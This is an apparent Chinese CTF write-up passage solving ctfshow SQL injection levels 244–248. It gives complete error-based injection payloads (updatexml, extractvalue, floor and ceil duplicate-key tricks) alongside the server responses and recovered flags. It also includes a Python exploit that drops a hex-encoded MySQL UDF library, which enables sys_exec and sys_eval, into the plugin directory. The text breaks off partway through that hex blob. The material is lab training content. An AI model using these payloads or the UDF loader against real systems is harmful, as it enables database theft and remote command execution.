class="line"></span><br></pre></td></tr></table></figure></div>





<h2 id="244"><a href="#244" class="headerlink" title="244"></a>244</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//备份表</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure></div>



<p>基础的报错注入，直接上payload</p>
<h3 id="写法1-–updatexml"><a href="#写法1-–updatexml" class="headerlink" title="写法1 –updatexml"></a>写法1 –updatexml</h3><p>测试</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span>koishi<span class="string">&#x27;,concat(0x2c,(select database())),&#x27;</span>cirno<span class="string">&#x27;);--+</span></span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 表名</span><br><span class="line"># &#123;&quot;code&quot;:<span class="number">0</span>,&quot;msg&quot;:&quot;XPATH syntax error: &#x27;|banlist,ctfshow_flag,ctfshow_us&#x27;&quot;,&quot;count&quot;:<span class="number">1</span>,&quot;data&quot;:[]&#125;</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) %23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 列名</span></span><br><span class="line"><span class="string"># &#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;XPATH syntax error: &#x27;</span><span class="operator">|</span>id,flag,info<span class="string">&#x27;&quot;,&quot;count&quot;:1,&quot;data&quot;:[]&#125;</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7c</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;ctfshow_flag&#x27;</span>)),<span class="number">1</span>) <span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line">（因为返回最多<span class="number">32</span>个字符，所以我们要使用substr或者mid等分别查询）</span><br><span class="line"># 字段值<span class="number">1</span></span><br><span class="line"># &#123;&quot;code&quot;:<span class="number">0</span>,&quot;msg&quot;:&quot;XPATH syntax error: &#x27;|ctfshow&#123;eb2bbc9e-e1f1-41c1-aa6d&#x27;&quot;,&quot;count&quot;:<span class="number">1</span>,&quot;data&quot;:[]&#125;</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7c,(select flag from ctfshow_flag)),1) %23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 字段值2</span></span><br><span class="line"><span class="string"># &#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;XPATH syntax error: &#x27;</span><span class="operator">|</span><span class="number">6</span>d<span class="operator">-</span>be9c13942a09&#125;<span class="string">&#x27;&quot;,&quot;count&quot;:1,&quot;data&quot;:[]&#125;</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7c</span>,mid((<span class="keyword">select</span> flag <span class="keyword">from</span> ctfshow_flag),<span class="number">30</span>,<span class="number">30</span>)),<span class="number">1</span>) <span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line">#最终拼起来就是ctfshow&#123;eb2bbc9e<span class="operator">-</span>e1f1<span class="number">-41</span>c1<span class="operator">-</span>aa6d<span class="operator">-</span>be9c13942a09&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="写法2-–extractvalue"><a href="#写法2-–extractvalue" class="headerlink" title="写法2 –extractvalue"></a>写法2 –extractvalue</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">测试</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or extractvalue(rand(),concat(0x2c,(select database())));--+</span></span><br></pre></td></tr></table></figure></div>



<p>（rand（）可以换成随便的字符）</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 查表名</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or extractvalue(rand(),concat(0x2c,(select group_concat(table_name)from information_schema.tables where table_schema=database())));--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查列名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> extractvalue(rand(),concat(<span class="number">0x2c</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()<span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;ctfshow_flag&#x27;</span>)));<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 查数据<span class="comment">--1</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or extractvalue(rand(),concat(0x2c,(select group_concat(flag)from ctfshow_flag)));--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查数据--2</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> extractvalue(rand(),concat(<span class="number">0x2c</span>,substr((<span class="keyword">select</span> group_concat(flag)<span class="keyword">from</span> ctfshow_flag),<span class="number">20</span>,<span class="number">42</span>)));<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">#拼接起来 ctfshow&#123;eb2bbc9e<span class="operator">-</span>e1f1<span class="number">-41</span>c1<span class="operator">-</span>aa6d<span class="operator">-</span>be9c13942a09&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="245"><a href="#245" class="headerlink" title="245"></a>245</h2><p>过滤了updatexml，没啥好说的，换成上面的 extractvalue 就行</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//过滤updatexml</span></span><br></pre></td></tr></table></figure></div>



<h2 id="246（updatexml和extractvalue-被ban）"><a href="#246（updatexml和extractvalue-被ban）" class="headerlink" title="246（updatexml和extractvalue 被ban）"></a>246（updatexml和extractvalue 被ban）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//过滤updatexml extractvalue</span></span><br></pre></td></tr></table></figure></div>



<h3 id="floor注入"><a href="#floor注入" class="headerlink" title="floor注入"></a>floor注入</h3><p>注入原理：<a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/column/235496.html" >Mysql报错注入之floor(rand(0)*2)报错原理探究 - FreeBuf网络安全行业门户 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>payload（就是注意我们使用了floor，和concat，拿到的结果要去除最后一个数字（那是拼接上的floor））</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 查数据表</span><br><span class="line"># &#123;&quot;code&quot;:<span class="number">0</span>,&quot;msg&quot;:&quot;Duplicate entry &#x27;ctfshow_flags1&#x27; for key &#x27;group_key&#x27;&quot;,&quot;count&quot;:<span class="number">1</span>,&quot;data&quot;:[]&#125;</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查字段</span></span><br><span class="line"><span class="string"># &#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;Duplicate entry &#x27;</span>flag21<span class="string">&#x27; for key &#x27;</span>group_key<span class="string">&#x27;&quot;,&quot;count&quot;:1,&quot;data&quot;:[]&#125;</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">3</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line"># 查字段值</span><br><span class="line"># &#123;&quot;code&quot;:<span class="number">0</span>,&quot;msg&quot;:&quot;Duplicate entry &#x27;ctfshow&#123;8744ed07-7a96-49e9-b64c-89896a8f939c&#125;1&#x27; for key &#x27;group_key&#x27;&quot;,&quot;count&quot;:<span class="number">1</span>,&quot;data&quot;:[]&#125;</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat((select flag2 from ctfshow_flags),floor(rand(0)*2))x from information_schema.tables group by x)a) %23</span></span><br></pre></td></tr></table></figure></div>





<h2 id="247（floor也无了）"><a href="#247（floor也无了）" class="headerlink" title="247（floor也无了）"></a>247（floor也无了）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//过滤updatexml extractvalue floor</span></span><br></pre></td></tr></table></figure></div>

<p>有过滤的报错注入，这次新增禁用 <code>floor</code>，还可以用 ceil 代替（和floor是反着来的，但是本质上利用floor的点没变，改floor为ceil即可）。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 查数据表</span><br><span class="line"># &#123;&quot;code&quot;:<span class="number">0</span>,&quot;msg&quot;:&quot;Duplicate entry &#x27;ctfshow_flagsa2&#x27; for key &#x27;group_key&#x27;&quot;,&quot;count&quot;:<span class="number">1</span>,&quot;data&quot;:[]&#125;</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),ceil(rand(0)*2))x from information_schema.tables group by x)a) %23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查字段(注意这里flag? 中有? 所以要用反引号包裹起来，免得被当成url处理了)</span></span><br><span class="line"><span class="string"># &#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;Duplicate entry &#x27;</span>flag?<span class="number">2</span><span class="string">&#x27; for key &#x27;</span>group_key<span class="string">&#x27;&quot;,&quot;count&quot;:1,&quot;data&quot;:[]&#125;</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">3</span>,<span class="number">1</span>),<span class="built_in">ceil</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line"># 查字段值</span><br><span class="line"># &#123;&quot;code&quot;:<span class="number">0</span>,&quot;msg&quot;:&quot;Duplicate entry &#x27;ctfshow&#123;22489aed-e513-475e-96f5-985a6eaf43c0&#125;2&#x27; for key &#x27;group_key&#x27;&quot;,&quot;count&quot;:<span class="number">1</span>,&quot;data&quot;:[]&#125;</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat((select `flag?` from ctfshow_flagsa),ceil(rand(0)*2))x from information_schema.tables group by x)a) %23</span></span><br></pre></td></tr></table></figure></div>



<h1 id="udf-注入"><a href="#udf-注入" class="headerlink" title="udf 注入"></a>udf 注入</h1><h2 id="知识学习-1"><a href="#知识学习-1" class="headerlink" title="知识学习"></a>知识学习</h2><p>参考文章： <a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35938621/article/details/119716077" >(37条消息) 【SQL注入】UDF提权命令执行_孤桜懶契的博客-CSDN博客_sqlmap udf提权 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p><strong>1 查看可操作路径</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> &quot;%secure%&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>secure_file_priv值为null，表示mysql不允许导入导出，此时我们只能通过别的方法将udf.dll写入安装路径</strong></p>
<p><strong>2 查看plugin目录路径</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@plugin_dir</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<p>这篇文章讲的肥肠清楚，这里只写了一点点</p>
<h2 id="248"><a href="#248" class="headerlink" title="248"></a>248</h2><p><strong>mysql的UAF注入,简单来说就是把dll文件写到目标机子的plugin目录，这个目录是可以通过select @@plugin_dir来得到的。</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;udf.so&#x27;</span>;   <span class="operator">/</span><span class="operator">/</span>导入udf函数</span><br></pre></td></tr></table></figure></div>



<p><strong>题目</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无过滤</span></span><br><span class="line">(测试发现还是有过滤的，有<span class="keyword">or</span>、<span class="keyword">and</span>之类的，所以我们就用不了盲注等方法了。md狗比又不说waf，现在正常手段没用了)</span><br></pre></td></tr></table></figure></div>



<p>看题目加上测试，发现存在堆叠注入</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;select version();#</span></span><br><span class="line"><span class="string"># &#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u6210\u529f&quot;,&quot;count&quot;:1,&quot;data&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;ctfshow&quot;,&quot;pass&quot;:&quot;ctfshow&quot;&#125;,&#123;&quot;version()&quot;:&quot;10.3.18-MariaDB&quot;&#125;]&#125;</span></span><br></pre></td></tr></table></figure></div>



<p><strong>看一下可操作路径</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show global variables like &quot;%secure%&quot;;#</span></span><br></pre></td></tr></table></figure></div>

<p><strong>发现</strong></p>
<blockquote>
<p>{“Variable_name”:”secure_auth”,”Value”:”ON”},{“Variable_name”:”secure_file_priv”,”Value”:””},{“Variable_name”:”secure_timestamp”,”Value”:”NO”}]}</p>
</blockquote>
<p><code>@@secure_file_priv: null</code>不能写入文件，所以写木马的方式也失效了，要是能提权写文件就好了</p>
<p><strong>接着看看plugin目录路径</strong></p>
<blockquote>
<p>{“@@plugin_dir”:”/usr/lib/mariadb/plugin/“}]}</p>
</blockquote>
<p>目录&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;</p>
<p>具体手操见上面学习文章中的步骤</p>
<p>这里放个脚本（靶机是linux的，url和文件目录根据需要进行修改）</p>
<h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://419e5714-21cb-4a29-82d4-cecf0bb82bf7.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line">payload = <span class="string">&quot;?id=1&#x27;;select &#x27;&#123;&#125;&#x27; into dumpfile &#x27;/usr/lib/mariadb/plugin/&#123;&#125;.txt&#x27;--+&quot;</span></span><br><span class="line">acquire = <span class="string">&quot;?id=1&#x27;;select load_file(&#x27;/usr/lib/mariadb/plugin/&#123;&#125;.txt&#x27;)--+&quot;</span></span><br><span class="line">text = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"></span><br><span class="line">udf=<span class="string">&quot;7F454C4602010100000000000000000003003E0001000000D00C0000000000004000000000000000E8180000000000000000000040003800050040001A00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050E57464040000006412000000000000641200000000000064120000000000009C000000000000009C00000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002B0000001500000005000000280000001E000000000000000000000006000000000000000C00000000000000070000002A00000009000000210000000000000000000000270000000B0000002200000018000000240000000E00000000000000040000001D0000001600000000000000130000000000000000000000120000002300000010000000250000001A0000000F000000000000000000000000000000000000001B00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000A00000011000000000000000000000000000000000000000D0000002600000017000000000000000800000000000000000000000000000000000000000000001F0000001C0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119C4C93DA4400398046883140000001600000017000000190000001B0000001D0000002000000022000000000000002300000000000000240000002500000027000000290000002A00000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED871581CC1E2F7DEA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF36AC68AE3B9FD4A0AC73D1C525681B320B5911FEAB5FBE120000000000000000000000000000000000000000000000000000000003000900A00B0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000E0000000120000000000000000000000DE01000000000000790100001200000000000000000000007700000000000000BA0000001200000000000000000000003504000000000000F5000000120000000000000000000000C2010000000000009E010000120000000000000000000000D900000000000000FB000000120000000000000000000000050000000000000016000000220000000000000000000000FE00000000000000CF000000120000000000000000000000AD00000000000000880100001200000000000000000000008000000000000000AB010000120000000000000000000000250100000000000010010000120000000000000000000000DC00000000000000C7000000120000000000000000000000C200000000000000B5000000120000000000000000000000CC02000000000000ED000000120000000000000000000000E802000000000000E70000001200000000000000000000009B00000000000000C200000012000000000000000000000028000000000000008001000012000B007A100000000000006E000000000000007500000012000B00A70D00000000000001000000000000001000000012000C00781100000000000000000000000000003F01000012000B001A100000000000002D000000000000001F01000012000900A00B0000000000000000000000000000C30100001000F1FF881720000000000000000000000000009600000012000B00AB0D00000000000001000000000000007001000012000B0066100000000000001400000000000000CF0100001000F1FF981720000000000000000000000000005600000012000B00A50D00000000000001000000000000000201000012000B002E0F0000000000002900000000000000A301000012000B00F71000000000000041000000000000003900000012000B00A40D00000000000001000000000000003201000012000B00EA0F0000000000003000000000000000BC0100001000F1FF881720000000000000000000000000006500000012000B00A60D00000000000001000000000000002501000012000B00800F0000000000006A000000000000008500000012000B00A80D00000000000003000000000000001701000012000B00570F00000000000029000000000000005501000012000B0047100000000000001F00000000000000A900000012000B00AC0D0000000000009A000000000000008F01000012000B00E8100000000000000F00000000000000D700000012000B00460E000000000000E800000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F6765745F6465696E6974007379735F657865635F6465696E6974007379735F6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C00666F726B00737973636F6E66006D6D6170007374726E6370790077616974706964007379735F6576616C006D616C6C6F6300706F70656E007265616C6C6F630066676574730070636C6F7365007379735F6576616C5F696E697400737472637079007379735F657865635F696E6974007379735F7365745F696E6974007379735F6765745F696E6974006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F657865630073797374656D007379735F73657400736574656E76007379735F7365745F6465696E69740066726565007379735F67657400676574656E76006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100B20100001000000000000000751A690900000200D401000000000000801720000000000008000000000000008017200000000000D01620000000000006000000020000000000000000000000D81620000000000006000000030000000000000000000000E016200000000000060000000A00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000A00000000000000000000003817200000000000070000000B00000000000000000000004017200000000000070000000C00000000000000000000004817200000000000070000000D00000000000000000000005017200000000000070000000E00000000000000000000005817200000000000070000000F00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883EC08E827010000E8C2010000E88D0500004883C408C3FF35320B2000FF25340B20000F1F4000FF25320B20006800000000E9E0FFFFFFFF252A0B20006801000000E9D0FFFFFFFF25220B20006802000000E9C0FFFFFFFF251A0B20006803000000E9B0FFFFFFFF25120B20006804000000E9A0FFFFFFFF250A0B20006805000000E990FFFFFFFF25020B20006806000000E980FFFFFFFF25FA0A20006807000000E970FFFFFFFF25F20A20006808000000E960FFFFFFFF25EA0A20006809000000E950FFFFFFFF25E20A2000680A000000E940FFFFFFFF25DA0A2000680B000000E930FFFFFFFF25D20A2000680C000000E920FFFFFFFF25CA0A2000680D000000E910FFFFFFFF25C20A2000680E000000E900FFFFFFFF25BA0A2000680F000000E9F0FEFFFF00000000000000004883EC08488B05F50920004885C07402FFD04883C408C390909090909090909055803D900A2000004889E5415453756248833DD809200000740C488B3D6F0A2000E812FFFFFF488D05130820004C8D2504082000488B15650A20004C29E048C1F803488D58FF4839DA73200F1F440000488D4201488905450A200041FF14C4488B153A0A20004839DA72E5C605260A2000015B415CC9C3660F1F8400000000005548833DBF072000004889E57422488B05530920004885C07416488D3DA70720004989C3C941FFE30F1F840000000000C9C39090C3C3C3C331C0C3C341544883C9FF4989F455534883EC10488B4610488B3831C0F2AE48F7D1488D69FFE8B6FEFFFF83F80089C77C61754FBF1E000000E803FEFFFF488D70FF4531C94531C031FFB921000000BA07000000488D042E48F7D64821C6E8AEFEFFFF4883F8FF4889C37427498B4424104889EA4889DF488B30E852FEFFFFFFD3EB0CBA0100000031F6E802FEFFFF31C0EB05B8010000005A595B5D415CC34157BF00040000415641554531ED415455534889F34883EC1848894C24104C89442408E85AFDFFFFBF010000004989C6E84DFDFFFFC600004889C5488B4310488D356A030000488B38E814FEFFFF4989C7EB374C89F731C04883C9FFF2AE4889EF48F7D1488D59FF4D8D641D004C89E6E8DDFDFFFF4A8D3C284889DA4C89F64D89E54889C5E8A8FDFFFF4C89FABE080000004C89F7E818FDFFFF4885C075B44C89FFE82BFDFFFF807D0000750A488B442408C60001EB1F42C6442DFF0031C04883C9FF4889EFF2AE488B44241048F7D148FFC94889084883C4184889E85B5D415C415D415E415FC34883EC08833E014889D7750B488B460831D2833800740E488D353A020000E817FDFFFFB20188D05EC34883EC08833E014889D7750B488B460831D2833800740E488D3511020000E8EEFCFFFFB20188D05FC3554889FD534889D34883EC08833E027409488D3519020000EB3F488B46088338007409488D3526020000EB2DC7400400000000488B4618488B384883C70248037808E801FCFFFF31D24885C0488945107511488D351F0200004889DFE887FCFFFFB20141585B88D05DC34883EC08833E014889F94889D77510488B46088338007507C6010131C0EB0E488D3576010000E853FCFFFFB0014159C34154488D35EF0100004989CC4889D7534889D34883EC08E832FCFFFF49C704241E0000004889D8415A5B415CC34883EC0831C0833E004889D7740E488D35D5010000E807FCFFFFB001415BC34883EC08488B4610488B38E862FBFFFF5A4898C34883EC28488B46184C8B4F104989F2488B08488B46104C89CF488B004D8D4409014889C6F3A44C89C7498B4218488B0041C6040100498B4210498B5218488B4008488B4A08BA010000004889C6F3A44C89C64C89CF498B4218488B400841C6040000E867FBFFFF4883C4284898C3488B7F104885FF7405E912FBFFFFC3554889CD534C89C34883EC08488B4610488B38E849FBFFFF4885C04889C27505C60301EB1531C04883C9FF4889D7F2AE48F7D148FFC948894D00595B4889D05DC39090909090909090554889E5534883EC08488B05C80320004883F8FF7419488D1DBB0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E86FFBFFFF4883C408C345787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D657465720045787065637465642065786163746C792074776F20617267756D656E747300457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E34004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F290000011B033B980000001200000040FBFFFFB400000041FBFFFFCC00000042FBFFFFE400000043FBFFFFFC00000044F